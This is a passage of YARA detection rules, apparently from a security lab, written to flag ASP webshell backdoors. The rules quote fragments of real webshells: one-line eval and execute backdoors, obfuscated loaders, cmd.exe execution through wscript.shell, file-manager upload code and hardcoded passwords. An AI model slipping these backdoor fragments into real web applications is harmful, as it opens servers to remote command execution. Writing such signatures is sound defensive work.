        $x1 = "Target = \"D:\\hshome\\masterhr\\masterhr.com\\\"  ' ---Directory to which files will be DUMPED Too and From" fullword ascii
        $x2 = "<!-- Copyright Vela iNC. Apr2003 [www.shagzzz.cjb.net] Coded by ~sir_shagalot -->" fullword ascii
        $s3 = "fso.CopyFile Request.QueryString(\"txtpath\") & \"\\\" & Request.Form(\"Fname\"),Target & Request.Form(\"Fname\")" fullword ascii
        $s4 = "fso.CopyFile Target & Request.Form(\"ToCopy\"), Request.Form(\"txtpath\") & \"\\\" & Request.Form(\"ToCopy\")" fullword ascii
        $s5 = "Response.write \"<font face=arial size=-2>You need to click [Create] or [Delete] for folder operations to be</font>\"" fullword ascii
        $s6 = "<form method=post name=frmCopySelected action=\"<%=Request.Servervariables(\"SCRIPT_NAME\")%>?txtpath=<%=MyPath%>\">" fullword ascii
        $s7 = "<BR><center><form method=post action=\"<%=Request.Servervariables(\"SCRIPT_NAME\")%>?txtpath=<%=MyPath%>\">" fullword ascii
        $s8 = "<table><tr><td><%If Request.Form(\"chkXML\") = \"on\"  Then getXML(myQuery) Else getTable(myQuery) %></td></tr></table></form>" fullword ascii
        $s9 = "<form method=\"post\" action=\"<%=Request.Servervariables(\"SCRIPT_NAME\")%>\" name=\"myform\" >" fullword ascii
        $s10 = "Response.Write \"<tr><td><font color=gray>Type: </font></td><td>\" & File.ContentType & \"</td></tr>\"" fullword ascii
        $s11 = "<BR><input type=text width=40 size=60 name=txtpath value=\"<%=showPath%>\" ><input type=submit name=cmd value=\"  View  \" >" fullword ascii
        $s12 = "Document.frmSQL.txtSQL.value = \"select name as 'TablesListed' from sysobjects where xtype='U' order by name\"" fullword ascii
        $s13 = "<INPUT TYPE=\"SUBMIT\" NAME=cmd VALUE=\"Save As\" TITLE=\"This write to the file specifed and overwrite it without warning.\">" fullword ascii
        $s14 = "<input type=submit name=cmd value=Create><input type=submit name=cmd value=Delete><input type=hidden name=DirStuff value=@>" fullword ascii
        $s15 = "<INPUT type=password name=code ></td><td><INPUT name=submit type=submit value=\" Access \">" fullword ascii
        $s16 = "Document.frmSQL.txtSQL.value = \"SELECT * FROM \" & vbcrlf & \"WHERE \" & vbcrlf & \"ORDER BY \"" fullword ascii
        $s17 = "<form name=frmSQL action=\"<%=Request.Servervariables(\"SCRIPT_NAME\")%>?qa=@\" method=Post>" fullword ascii
        $s18 = "<FORM method=\"post\" action=\"<%=Request.Servervariables(\"SCRIPT_NAME\")%>\" >" fullword ascii
        $s19 = "if RS.properties(\"Asynchronous Rowset Processing\") = 16 then" fullword ascii
        $s20 = "<td bgcolor=\"#000000\" valign=\"bottom\"><font face=\"Arial\" size=\"-2\" color=gray>NOTE FOR UPLOAD -" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 100KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule be2fedc38fc0c3d1f925310d5156ccf3d80f1432
{
     meta:
        description = "asp - file be2fedc38fc0c3d1f925310d5156ccf3d80f1432.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "171dd57587534ad60299f0df33b6250a5b9534cf2e8cf91ed2c22da07c46bfb4"
     strings:
        $x1 = "response.write server.createobject(\"wscript.shell\").exec(\"cmd.exe /c \"&request.form(\"cmd\")).stdout.readall" fullword ascii
        $x2 = "RRS\"Zend: C:\\Program Files\\Zend\\ZendOptimizer-3.3.0\\lib\\Optimizer-3.3.0\\php-5.2.x\\ZendOptimizer.dll  <br>\"" fullword ascii
        $x3 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\\"\")'>AllUsers</a>n#" fullword ascii
        $s4 = "case \"apjdel\":apjdel():case \"Servu7x\":su7():case \"fuzhutq1\":fuzhutq1():case \"fuzhutq2\":fuzhutq2():case \"fuzhutq3\":fuzh" ascii
        $s5 = "<a href='javascript:ShowFolder(\"\"c:\\\\Documents and Settings\\\\All Users\\\\a" fullword ascii
        $s6 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\`" fullword ascii
        $s7 = "RRS\"c:\\Documents and Settings\\All Users\\Application Data\\Hagel Technologies\\DU Meter\\log.csv <br>\"" fullword ascii
        $s8 = "RRS\"C:\\Program Files\\Helicon\\ISAPI_Rewrite3\\error.log <br>\"" fullword ascii
        $s9 = "RRS\"c:\\Program Files\\Common Files\\Symantec Shared\\Persist.Dat  <br>\"" fullword ascii
        $s10 = "RRS\"C:\\7i24.com\\iissafe\\log\\startandiischeck.txt  <br>\"" fullword ascii
        $s11 = "RRS\"c:\\Program Files\\Common Files\\Symantec Shared\\Validate.dat  <br>\"" fullword ascii
        $s12 = "xPost.Open \"POST\", \"http://127.0.0.1:\"& port &\"/secdst\",True, \"\", \"\"" fullword ascii
        $s13 = "<a href='javascript:ShowFolder(\"\"C:\\\\WINDOWS\\\\system32\\\\config\\\\\"\")'>config</a>WP" fullword ascii
        $s14 = "> <INPUT type=Password name=Pass size=22>&nbsp;<input type=submit value=Login><hr><br>\"&mmshell&\"</div></center>\"" fullword ascii
        $s15 = "<a href='javascript:ShowFolder(\"\"c:\\\\WINDOWS\\\\system32\\\\inetsrv\\\\data\\\\\"\")'>data</a>eF<a href='javascript:ShowFold" ascii
        $s16 = "xPost3.Open \"POST\", \"http://127.0.0.1:\"& port &\"/secdst\", True" fullword ascii
        $s17 = "RRS\"c:\\Program Files\\360\\360Safe\\deepscan\\Section\\mutex.db <br>\"" fullword ascii
        $s18 = "xPost.Send loginuser & loginpass & mt & newdomain & newuser & quit" fullword ascii
        $s19 = ":Sub Scan(targetip, portNum):On Error Resume Next:set conn = Server.CreateObject(\"ADODB.connection\"):connstr=\"Provider=SQLOLE" ascii
        $s20 = "RRS\"C:\\Program Files\\Helicon\\ISAPI_Rewrite3\\Rewrite.log<br>\"" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule a547868783e7f3244bba67b88025e6db23047ae5
{
     meta:
        description = "asp - file a547868783e7f3244bba67b88025e6db23047ae5.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "d992b6bdabc0739c9a1f2c5a3a27fa02ef302e2df6ed52986a08a5fc359aab3f"
     strings:
        $s1 = "<%r+k-es+k-p+k-on+k-se.co+k-d+k-e+k-p+k-age=936:e+k-v+k-a+k-l r+k-e+k-q+k-u+k-e+k-s+k-t(\"4885\")%>" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule c11ae415f7abfaff5baf57ecfbff316f32a7eb3f
{
     meta:
        description = "asp - file c11ae415f7abfaff5baf57ecfbff316f32a7eb3f.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "dc61adbfea570cac72f480b3f3b2bee36d43e4952cb67ff875804e65172ee2f7"
     strings:
        $s1 = "execute(play)" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule b0e2a84de0421b32d0937b735a561178f6ab4383
{
     meta:
        description = "asp - file b0e2a84de0421b32d0937b735a561178f6ab4383.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "93fed8ad705c836cfa23e67c74b26644a03e283f0c2c0a385caace2a930b7d03"
     strings:
        $s1 = "<%r+k-es+k-p+k-on+k-se.co+k-d+k-e+k-p+k-age=936:e+k-v+k-a+k-l r+k-e+k-q+k-u+k-e+k-s+k-t(\"0le\")%>" fullword ascii
     condition:
        ( uint16(0) == 0x4947 and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_3022b13c0d914ae454a70d7f425a6df4b0f3f026
{
     meta:
        description = "asp - file 3022b13c0d914ae454a70d7f425a6df4b0f3f026.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "d58b74767174ec3cef064568e6d95b1f15ec7b1d7f7956b1f89d662f07e62b28"
     strings:
        $s1 = "logimg   =\"http://odayexp.com/image/logo/shell.jpg\"'" fullword ascii
        $s2 = "N=KFcZK2X:W~Ky~9jDlDDRf&2x9Rf): cnG/rObWUP{~!=K+ :Xwn~{P+):+cZ4mDk+Y,'rL4y&q r)jojP',P cI+m[P+XY=K+R/sK/n)bWPGF 3Xk/Odvj21mh" fullword ascii
        $s3 = "D2[1t.c2,#L^tM`vyb'm4DvvT#'^4DccFb[1t.c8F*b'1t.`O1*[^4DvFFW#L^tM`q!l#'^4D`8q *[m4.cF8v*[^t.c+ b[14DvFfbLmt.c8!b)U;(Pj1l" fullword ascii
        $s4 = "@!zl@*@!&Y9@*@!zOD@*E@#@&]IUE@!DD@*@!DNP4nbo4Y{vy!v@*@!mPtM+6xBNl-lkm.raY)U4WSsW^[nDvJrJ'InKmY4`\"GWDnCO4#[EEr#v@*" fullword ascii
        $s5 = "1l0d.;4-L#kWnN4}S#b`.YUhnHv+NK/xA[xAGWxb?{x3WWUb?l#MO?S+Hc9xEG$`PGK,T{k~MWw)#-=-SDD?%4}`Or^w?{.YUh+glbu-u-~kUkSMYjL(6`" fullword ascii
        $s6 = "~r?^mxhWDDJ=jmmxKWMYcb=ZlknProW(C^3r)TW8l^Vv#lZmd+,JjnM\\EElUjCmDrKxxM+$E+kYvE?`l^YbWUE*@#@&bWP,xWD~r/" fullword ascii
        $s7 = "]+$Enn{BU'~7lsE{v8*v,/by+{Bb2B,xC:^qsvHw+{vw!YPD'=@!bxUqx?(@*?=@!zD.@*@!zO[@*x4d2pWA[?'E@*=LxwsswsMxB[sLmKVG@!DNP(@!zDN@*" fullword ascii
        $s8 = "'v?;8skOB,OXa+xvkE4hrDB~\\ms!+xEM}MrE@*r~@#@&I]?r@!&O9@*@!JOD@*@!z6G.:@*@!JYC4sn@*J@#@&\"]?r@!OC(V+~AbNOt{v8!TuB,t+bo4O'E," fullword ascii
        $s9 = "lAw*U=3:slslVGDx==ALmK~K4+U3w2s=x?a3s1G^W.&0,Ao,k6|'8PPt&0~];+x#]/vk#1G[+vKtS3xUWK'uP;GV&#|3^/+|Sl!b#\"dvkbd+6Y`1W9n`:HJ2" fullword ascii
        $s10 = "Z6S}]),aTTZ!!TI,?/I}JdA)\"O:Ib;| /rdr]),aTTZ!!ZIPwr1:Robtqd5lP-nMNCxmIPUZ]6dSA)] f)Inj_b9}" fullword ascii
        $s11 = "Y l^scoG^NkExc/!8:bYc#pBS*Z!!*IJ@#@&I\"jE@!J/1DrwO@*r@#@&mmd+, @#@&k+Y~8{?nD7nMR/M+mY+}4NnmD`EHbm.GkW0D (tSC:PKJ*@#@&4 W2n" fullword ascii
        $s12 = "'==yWVd2ms=U,^wsowsM'U?aT^W^WTU?P8O{UUy4+bot@*@!ON,[?@!ODzHm:nkk2VmW8%cf/2I?[=@*LU(sows?UU[swGVKDxU,4L^?U Z=kTtY{O[P4+JY[@*@!h" fullword ascii
        $s13 = "l9I3MEl1lsV,]+mN]3V`#l/m/nPrCDYE=mmVV,lDO`*)/lk+~EUtWSqsbV+rlj+DPzA/'HnSPJAwlb~Z j4WhqobVn`Unk/rKxvJsKV9nDhlOtr#blU+Y,)A;'1KO4k" fullword ascii
        $s14 = "Dxj5Srd3f~RFpKC?khKD['E'hlj/SGD9[EI`/2.~&fxJLr9)dDD5E+MX,xPr+a+1PhCkY+M N(WRX2mmsNktnVs~EJ~[,]2$E3dDR0G.s`EHt9r#~LPrBJ=/" fullword ascii
        $s15 = "0WAUcJ-U-u=u4SmYcnbOw^Pj~{YtKC*=nx:4?P@*?#@!`FDthCN,lU#,!b4vlYvKYkk/Aas+wkwR~Z(W#`qY4Kl*~cTDtnCn,ksXwGaR/;s*=@*?+MUY1+@!z" fullword ascii
        $s16 = "&fK_),qwXi~A}I93\"OA}PK}HO;6Jr\"),aT!0TZ!IP;6S}Il~[!!WWZ!IP~6\"f3\"O:rn Z}Jr\")~aZ!0TZ!i,orgKOw)\\qd5=P-+.[mxCi,$r\"f3] Iq!u:O" fullword ascii
        $s17 = "j&'jq#[@*@!zO'?@!zOj&'jqM@*?=[@*@!JYwp@!JO@*Lx8/?U+=?/wmU'?PmKsosws?U=aooKVGD{=P(o^=? !=rTtO'D[,tn@!YM@*@!UqZxUM@*=P#+U[,k0#a'?" fullword ascii
        $s18 = "x@#@&29kY}rj~',2[kDr6#,OP+*@#@&2x9~(0@#@&&0~2[rDr6.,@*',&+~:t+U@#@&2[kD6}.~{PANkDr}#P Pf @#@&3U9Pq6@#@&&0PA[rY}rjP@*'~q+PPt" fullword ascii
        $s19 = "\\rDGSh[=Y4Kl?[nxMmW;~UYCfmTpc ~RAfrdYcB+DRG0K/^.tkD{[+7kDK=K+,lkl8lOOGl^:a/W;R4|bxY4HKZxY,j" fullword ascii
        $s20 = "xDVroUxE&vPmdwmxxv,mWsO{B+!4nbo4@*@!DNPLU@!ODUqx?&@*=|DN@*@!&#LU@!JH)HAU\".3ImdvUj2bC4^+n.jlD d" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 8 of them ) ) or ( all of them )
}

rule sig_34c86c7c6f5e42690b5c19064cb0d1a54df28682
{
     meta:
        description = "asp - file 34c86c7c6f5e42690b5c19064cb0d1a54df28682.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "cbc5224a56cab236a840d4a2756eb614a58b1a2e5955ae42270070e58e21f566"
     strings:
        $s1 = "execute(UnEncode(darkst))" fullword ascii
        $s2 = "If Asc(Mid(temp, i, 1)) < 32 Or Asc(Mid(temp, i, 1)) > 126 Then" fullword ascii
        $s3 = "a = a & Chr(Asc(Mid(temp, i, 1)))" fullword ascii
        $s4 = "pk=asc(mid(temp,i,1))-but" fullword ascii
        $s5 = "function UnEncode(temp)" fullword ascii
        $s6 = "if mid(temp,i,1)<>\"" fullword ascii
        $s7 = "for i = 1 to len(temp)" fullword ascii
        $s8 = "!Sftqpotf/xsjuf!#=ufyubsfb!obnf>tBwfebub!dpmt>91!spxt>21!xjeui>43?=0ufyubsfb?#!" fullword ascii
        $s9 = "!Tfu!pckGTP!>!Tfswfs/DsfbufPckfdu)#Tdsjqujoh/GjmfTztufnPckfdu#*!" fullword ascii
        $s10 = "!Sftqpotf/xsjuf!tfswfs/nbqqbui)Sfrvftu/TfswfsWbsjbcmft)#TDSJQU`OBNF#**!" fullword ascii
        $s11 = "!Sftqpotf/Xsjuf!#=joqvu!uzqf>ufyu!obnf>tztufnqbui!xjeui>43!tj{f>61?#!" fullword ascii
        $s12 = "!Tfu!pckDpvouGjmf>pckGTP/DsfbufUfyuGjmf)sfrvftu)#tztufnqbui#*-Usvf*!" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 5KB and ( 8 of them ) ) or ( all of them )
}

rule ad438329fb63072d5ddc3cdcd533aec4e6b2579f
{
     meta:
        description = "asp - file ad438329fb63072d5ddc3cdcd533aec4e6b2579f.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "955217954ef69f47414d820904fa8d99b9fbfc78f630ac03181ae9fafadaea3f"
     strings:
        $s1 = "<%a=request(\"cmd\")%><%eval a%>" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_752cb8dad042e353cd126129db17e1120577477c
{
     meta:
        description = "asp - file 752cb8dad042e353cd126129db17e1120577477c.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "aff965e0f570c8ae7596776b77b87eec8cb23ca601da6b23db4bd01e5b1b684b"
     strings:
        $x1 = "goTitle.innerHTML = HTMLencode(\"CMD.EXE \" + sUsername + \" @ \" + sHostname);" fullword ascii
        $s2 = "var sCmd = \"CMD.EXE /Q /V:ON /C \" + " fullword ascii
        $s3 = "var sCmd = \"cmd.exe /Q /C \" +" fullword ascii
        $s4 = "Response.addHeader(\"Content-Disposition\", \"attachment; filename=\" + sFilename);" fullword ascii
        $s5 = "<FORM enctype=\"multipart/form-data\" method=\"post\" action=\"?req=upload\" target=\"transferFrame\">" fullword ascii
        $s6 = "// compilation, is not ASCII or terminates the string with an encoded char," fullword ascii
        $s7 = "while (sRandom.length < iLength) sRandom += sRandomChars.charAt(Math.floor(Math.random() * sRandomChars.length));" fullword ascii
        $s8 = "// If it processed correctly, we'll add it to the POST info:" fullword ascii
        $s9 = "oXML.open(\"GET\", gsUrl + (asQuery.length > 0 ? \"?\" + asQuery.join(\"&\") : \"\"), false);" fullword ascii
        $s10 = "(iTimeout != 0 ? \"<SPAN class=\\\"stderr\\\">The command timed out after \" + iTimeout + \" seconds.<BR></SPAN>\" : \"\");" fullword ascii
        $s11 = "var oCMD = goWSS.Exec(sCmd);" fullword ascii
        $s12 = "function executeCommand() {" fullword ascii
        $s13 = "document.title = sUsername + \" @ \" + sHostname;" fullword ascii
        $s14 = "// with their HTML encoded equivalent, such as replacing '\\n' with \"<BR>\"" fullword ascii
        $s15 = "if (sDestinationPath.charAt(sDestinationPath.length - 1) != \"\\\\\") {" fullword ascii
        $s16 = "(gsCwd.charAt(gsCwd.length - 1) == \"\\\\\" ? \"\" : \"\\\\\") + " fullword ascii
        $s17 = "var aPart = processPostPart(sPart);" fullword ascii
        $s18 = "function processPostPart(sPart) {" fullword ascii
        $s19 = "// We're assuming our data is encoded using multipart-formdata, but" fullword ascii
        $s20 = "throw new Error(\"Additional lines found in cmd output: \\n\" + " fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 80KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_048865b2a45dd77f54cbfad0933aebfbd27d1dd9
{
     meta:
        description = "asp - file 048865b2a45dd77f54cbfad0933aebfbd27d1dd9.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "d4dc4ef06ce94466eaf6a49dba2017c7188002f9b726e4639ca2cfe5c2532b55"
     strings:
        $x1 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)" fullword ascii
        $s2 = "' -- Read the output from our command and remove the temp file -- '" fullword ascii
        $s3 = "szTempFile = \"C:\\\" & oFileSys.GetTempName( )" fullword ascii
        $s4 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>" fullword ascii
        $s5 = "' -- check for a command that we have posted -- '" fullword ascii
        $s6 = "' -- Use a poor man's pipe ... a temp file -- '" fullword ascii
        $s7 = "' Author: Maceo <maceo @ dogmile.com>" fullword ascii
        $s8 = "' -- create the COM objects that we will be using -- '" fullword ascii
        $s9 = "<input type=text name=\".CMD\" size=45 value=\"<%= szCMD %>\">" fullword ascii
        $s10 = "Set oFile = oFileSys.OpenTextFile (szTempFile, 1, False, 0)" fullword ascii
        $s11 = "<FORM action=\"<%= Request.ServerVariables(\"URL\") %>\" method=\"POST\">" fullword ascii
        $s12 = "Set oScript = Server.CreateObject(\"WSCRIPT.SHELL\")" fullword ascii
        $s13 = "Set oFileSys = Server.CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
        $s14 = "szCMD = Request.Form(\".CMD\")" fullword ascii
        $s15 = "Response.Write Server.HTMLEncode(oFile.ReadAll)" fullword ascii
        $s16 = "Set oScriptNet = Server.CreateObject(\"WSCRIPT.NETWORK\")" fullword ascii
        $s17 = "' -------------------------------------------" fullword ascii
        $s18 = "' --------------------o0o--------------------" fullword ascii
        $s19 = "Dim szCMD, szTempFile" fullword ascii
        $s20 = "Call oFileSys.DeleteFile(szTempFile, True)" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 4KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_2d882fdc35d21ac689fda21acf3dbd78f6c515b1
{
     meta:
        description = "asp - file 2d882fdc35d21ac689fda21acf3dbd78f6c515b1.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "a905652bd675eadfda2ba649a4bd69d036dc6fa0dc48b80a2010dbfac72a27da"
     strings:
        $s1 = "*\\G{00020430-0000-0000-C000-000000000046}#2.0#0#C:\\Windows\\System32\\stdole2.tlb#OLE Automation" fullword wide
        $s2 = "*\\G{000204EF-0000-0000-C000-000000000046}#4.2#9#C:\\PROGRA~1\\COMMON~1\\MICROS~1\\VBA\\VBA7.1\\VBE7.DLL#Visual Basic For Applic" wide
        $s3 = "<% execute request(\"ice\")%>a " fullword ascii
        $s4 = "<% execute request(\"a\")%>a" fullword ascii
        $s5 = "MSysNavPaneGroupsMSysNavPaneGroupToObjectsMSysNavPaneGroupToObjectsGroupIDMSysNavPaneGroupsId" fullword wide
        $s6 = "*\\G{4AFFC9A0-5F99-101B-AF4E-00AA003F0F07}#9.0#0#F:\\MicroSoft\\Office\\Office15\\MSACC.OLB#Microsoft Access 14.0 Object Library" wide
        $s7 = "MSysNavPaneGroupCategoriesMSysNavPaneGroupsMSysNavPaneGroupsGroupCategoryIDMSysNavPaneGroupCategoriesId" fullword wide
        $s8 = "0#0#C:\\W" fullword ascii
        $s9 = "GUID8DisplayViewsOnSharePointSite" fullword wide
     condition:
        ( uint16(0) == 0x0100 and filesize < 700KB and ( all of them ) ) or ( all of them )
}

rule f130d99ccd1dd8387842b9fdb0a69389672d9167
{
     meta:
        description = "asp - file f130d99ccd1dd8387842b9fdb0a69389672d9167.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "ea3606fa2294d6fbd348ae8666a0cda14a4d1157be9f9adaf34bec21094515e8"
     strings:
        $x1 = "Target = \"D:\\hshome\\masterhr\\masterhr.com\\\"  ' ---Directory to which files will be DUMPED Too and From" fullword ascii
        $x2 = "<!-- Copyright Vela iNC. Apr2003 [www.shagzzz.cjb.net] Coded by ~sir_shagalot -->" fullword ascii
        $s3 = "fso.CopyFile Request.QueryString(\"txtpath\") & \"\\\" & Request.Form(\"Fname\"),Target & Request.Form(\"Fname\")" fullword ascii
        $s4 = "fso.CopyFile Target & Request.Form(\"ToCopy\"), Request.Form(\"txtpath\") & \"\\\" & Request.Form(\"ToCopy\")" fullword ascii
        $s5 = "Response.write \"<font face=arial size=-2>You need to click [Create] or [Delete] for folder operations to be</font>\"" fullword ascii
        $s6 = "<form method=post name=frmCopySelected action=\"<%=Request.Servervariables(\"SCRIPT_NAME\")%>?txtpath=<%=MyPath%>\">" fullword ascii
        $s7 = "<BR><center><form method=post action=\"<%=Request.Servervariables(\"SCRIPT_NAME\")%>?txtpath=<%=MyPath%>\">" fullword ascii
        $s8 = "<table><tr><td><%If Request.Form(\"chkXML\") = \"on\"  Then getXML(myQuery) Else getTable(myQuery) %></td></tr></table></form>" fullword ascii
        $s9 = "<form method=\"post\" action=\"<%=Request.Servervariables(\"SCRIPT_NAME\")%>\" name=\"myform\" >" fullword ascii
        $s10 = "Response.Write \"<tr><td><font color=gray>Type: </font></td><td>\" & File.ContentType & \"</td></tr>\"" fullword ascii
        $s11 = "<BR><input type=text width=40 size=60 name=txtpath value=\"<%=showPath%>\" ><input type=submit name=cmd value=\"  View  \" >" fullword ascii
        $s12 = "Document.frmSQL.txtSQL.value = \"select name as 'TablesListed' from sysobjects where xtype='U' order by name\"" fullword ascii
        $s13 = "<INPUT TYPE=\"SUBMIT\" NAME=cmd VALUE=\"Save As\" TITLE=\"This write to the file specifed and overwrite it without warning.\">" fullword ascii
        $s14 = "<input type=submit name=cmd value=Create><input type=submit name=cmd value=Delete><input type=hidden name=DirStuff value=@>" fullword ascii
        $s15 = "<INPUT type=password name=code ></td><td><INPUT name=submit type=submit value=\" Access \">" fullword ascii
        $s16 = "Document.frmSQL.txtSQL.value = \"SELECT * FROM \" & vbcrlf & \"WHERE \" & vbcrlf & \"ORDER BY \"" fullword ascii
        $s17 = "<form name=frmSQL action=\"<%=Request.Servervariables(\"SCRIPT_NAME\")%>?qa=@\" method=Post>" fullword ascii
        $s18 = "<FORM method=\"post\" action=\"<%=Request.Servervariables(\"SCRIPT_NAME\")%>\" >" fullword ascii
        $s19 = "if RS.properties(\"Asynchronous Rowset Processing\") = 16 then" fullword ascii
        $s20 = "<td bgcolor=\"#000000\" valign=\"bottom\"><font face=\"Arial\" size=\"-2\" color=gray>NOTE FOR UPLOAD -" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 100KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule aed11eee4d134970937fb1b818f87f21f180d98b
{
     meta:
        description = "asp - file aed11eee4d134970937fb1b818f87f21f180d98b.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "1406daf1a5839bc08d876bb56eb233c2ffcd00713c76e3a130247ba6fb1cd227"
     strings:
        $s1 = "<%'<% loop <%:%><%execute request(\"sb\")%>" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_4442d2ffd41da9626e4366bf5146ea96b838d9c5
{
     meta:
        description = "asp - file 4442d2ffd41da9626e4366bf5146ea96b838d9c5.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "b5f9a45740a713b35199daca0138221b9629462e4af65b39ecf19db69a324e70"
     strings:
        $s1 = "<img src=\"http://i141.photobucket.com/albums/r61/22rockets/HeartBeat.gif\">" fullword ascii
        $s2 = "<%=\"<input name='pass' type='password' size='10'> <input \"%><%=\"type='submit' value='" fullword ascii
        $s3 = "- F4ckTeam<a href=\"http://team.f4ck.net\"><font color=\"#CCCCCC\">" fullword ascii
        $s4 = "<%=\"<center><br><form action='' method='post'>\"%>" fullword ascii
        $s5 = ":\"&server.mappath(request.servervariables(\"script_name\"))%>" fullword ascii
        $s6 = "if request(\"pass\")=\"123\" then  '" fullword ascii
        $s7 = "<%if session(\"pw\")<>\"go\" then %>" fullword ascii
        $s8 = "<%=\"<textarea name=da cols=50 rows=10 width=30></textarea>\"%>" fullword ascii
     condition:
        ( uint16(0) == 0x683c and filesize < 5KB and ( all of them ) ) or ( all of them )
}

rule sig_4d08ff2ff450b8450f5622222c4f44884d31983c
{
     meta:
        description = "asp - file 4d08ff2ff450b8450f5622222c4f44884d31983c.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "159fcc8ddaadf569910b0cf19aa843328710ba1688fb18d348aa60ffd08d3950"
     strings:
        $s1 = "DO1GV^lwknlmKV^l2/nI^kU+ 4+bo4O=F&TYpms+m.=4GDtpJJ@*@!D.@*r@#@&q6P.n$E+kORwWDscEDmNbW8EOOKxE#,xPr/AdrPK4n" fullword ascii
        $s2 = "m/K0Yar^u7kauX!Xb'RctDhu4Yhs-l/2kat2uNdauCkwXumTk-%/*-8JBlL.*P@#@&(0,D+D#CV,K4+UP@#@&kYnw8~lTD~@#@&/Yn2yPCoM~@#@&3^/" fullword ascii
        $s3 = "+(?4n^VPRR,J':gCs+'r@!JYD@*J@#@&I\"?~J@!Y.@*@!YN,dYHV+{EEwmN9kUolXa6IVbU+ tnrTtYlqF!Yi1s" fullword ascii
        $s4 = "SPrJEJ*PQ~8~PdnxvHlD^4Rjl^En#~R,qU/D.`tlO^4R.Cs!+SPrErJb,O,F#BJJE~r-E#@#@&77iq0,HWDPZ4n^3A6D`o?6qkR!+D36D+UdbWxHCs+cYwr^+b*P:t+" fullword ascii
        $s5 = "Z.nmY+vWk^+wmO4#LJ@!4.@*E'V+OfmO+tW[r6X`Wr^+2lD4*[E@!zDN@*@!zD.@*r@#@&did7j!xP{~?!xP3~q@#@&did7Ynha'EO" fullword ascii
        $s6 = "YPsG1lsoMG!w~mNskxb/D.lDW./,tC^0+Df~zmNNE~dk.+{BX!v@*@!zON@*E@#@&I]jrPP@!&DD@*J@#@&\"IjrP@!YD,l^ro" fullword ascii
        $s7 = "lHAS?6\\@#@&~~P,P,P~2H[,qW@#@&~P,P~~A1N~rw@#@&P,~,P~9?DlD:'9dYzIP_DS3U3F@#@&~P,PhAU[@#@&P,P~K9C{JE@#@&~P,PdnDPY+~{16K4(" fullword ascii
        $s8 = "'vfE@*@!JWWM:@*r@#@&I\"?r@!dm.raY~VmUo!lLn{BLC-m/^Db2DB@*r@#@&IIUJ9Gm!:nxDRA.bY+vv@!1+xDn.@*" fullword ascii
        $s9 = "x@#@&]IjE@!4.@*@!CP4DnW{BLC-m/^Db2D)4b/DWDHR(Cm0`bB@*@!8.@*PJ,'PADDc9n/1DbwOkGU,[~J@!&l@*@!8.@*J@#@&3MD Z^nmDl\"+kwW" fullword ascii
        $s10 = "`~\\bN`or^+KlD4BFS&xUYD\"+7csbVnnmY4Sr-J*b[Dsk^nSPM+aVCmncwks+hCY4~dnM\\+. tl2nmO4`E'J*[J'JBEJBFSFBFb~*@#@&i7di?EsorV" fullword ascii
        $s11 = "9kM'm=wwJ,[,\\8Z.J6P'PrRSKorUt+/or^+xJ,',\\8;Dd0PLPrRfb/C4^+xTrP[,-4;DS6~'PrO\"+snCO4/xFr~[,\\8/MS0~',{@#@&,~,P~,P,JOg+" fullword ascii
        $s12 = "ZM+CYnc6ks+aCY4#'E@!4D@*ELMnYGCD+\\KNb0Xv0bs+alOt*[E@!JYN@*@!zDD@*r@#@&didUEUPx~UEUP3~F@#@&77AxN~(6@#@&dij" fullword ascii
